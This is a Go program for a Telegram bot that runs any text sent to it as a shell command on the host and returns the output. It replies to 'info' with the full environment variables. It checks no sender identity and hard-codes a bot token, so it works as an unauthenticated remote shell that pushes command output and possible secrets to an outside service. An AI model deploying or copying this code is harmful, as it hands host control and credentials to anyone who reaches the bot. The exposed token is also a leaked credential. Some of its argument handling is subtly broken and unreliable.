package main

import (
	"bytes"
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"log"
	"os"
	"os/exec"
	"strings"
)

func check(err error) {
	if err != nil {
		log.Println(err)
	}
}

func main() {
	TOKEN := "686571708:AAFeh9b9_9Q7yhMaQjYe9BODD478Nyn04rI"
	bot, err := tgbotapi.NewBotAPI(TOKEN)
	check(err)
	bot.Debug = true
	log.Printf("Authorized on account %s", bot.Self.UserName)
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates, err := bot.GetUpdatesChan(u)
	check(err)
	var text string

	for update := range updates {
		if update.Message == nil {
			continue
		}
		if update.Message.Text == "info" {
			text = fmt.Sprint(os.Environ())
		} else {
			s := strings.Split(strings.Trim(update.Message.Text, " \n\r\t"), " ")
			if s[0] == "cd" && len(s) > 1 {
				err := os.Chdir(s[1])
				if err != nil {
					text = fmt.Sprint(err)
				} else {
					dir, _ := os.Getwd()
					text = "Successful changed directory to " + dir
				}
			} else {
				var cmd *exec.Cmd
				if len(s) <= 1 {
					cmd = exec.Command(s[0])
					cmd.Stdin = strings.NewReader("")
					var out bytes.Buffer
					cmd.Stdout = &out
					err := cmd.Run()
					text = out.String()
					if err != nil {
						log.Println(err)
						text = fmt.Sprint(err)
					}
				} else if strings.Trim(s[len(s)-1], "\n\r ") == "&" {
					if len(s) > 2 {
						cmd = exec.Command(s[0], s[1:len(s)-2]...)
					} else {
						cmd = exec.Command(s[0])
					}
					err := cmd.Run()
					log.Println(err)
					text = "Started process " + fmt.Sprint(cmd.Process.Pid)
				} else {
					cmd = exec.Command(s[0], s[1:]...)
					cmd.Stdin = strings.NewReader("")
					var out bytes.Buffer
					cmd.Stdout = &out
					err := cmd.Run()
					cmd.Wait()
					text = out.String()
					if err != nil {
						log.Println(err)
						text = fmt.Sprint(err)
					}
				}
			}
		}

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "```\n"+text+"```")
		msg.ParseMode = "markdown"
		bot.Send(msg)
	}
}
